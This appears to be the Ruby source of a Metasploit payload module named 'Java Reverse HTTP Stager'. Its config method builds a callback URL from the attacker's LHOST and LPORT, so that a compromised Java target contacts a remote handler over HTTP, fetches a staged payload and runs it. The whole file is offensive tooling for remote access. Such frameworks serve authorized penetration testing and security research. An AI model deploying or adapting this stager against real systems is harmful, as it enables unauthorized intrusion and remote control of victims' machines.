##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/handler/reverse_http'

module Metasploit3
  extend  Metasploit::Framework::Module::Ancestor::Handler

  include Msf::Payload::Stager
  include Msf::Payload::Java

  handler module_name: 'Msf::Handler::ReverseHttp'

  def initialize(info = {})
    super(
        Msf::Module::ModuleInfo.merge!(
            info,
            'Name'          => 'Java Reverse HTTP Stager',
            'Description'   => 'Tunnel communication over HTTP',
            'Author'        => [
                'mihi',  # all the hard work
                'egypt', # msf integration
                'hdm',   # windows/reverse_http
            ],
            'License'       => MSF_LICENSE,
            'Platform'      => 'Java',
            'Arch'          => ARCH_JAVA,
            'Convention'    => 'javaurl',
            'Stager'        => {'Payload' => ""}
        )
    )

    register_advanced_options(
      [
        Msf::OptInt.new('Spawn', [ true, "Number of subprocesses to spawn", 2 ])
      ], self.class
    )

    @class_files = [ ]
  end

  def config
    spawn = datastore["Spawn"] || 2
    c =  ""
    c << "Spawn=#{spawn}\n"
    c << "URL=http://#{datastore["LHOST"]}"
    c << ":#{datastore["LPORT"]}" if datastore["LPORT"]
    c << "/INITJM\n"

    c
  end

  #
  # Always wait at least 20 seconds for this payload (due to staging delays)
  #
  def wfs_delay
    20
  end
end
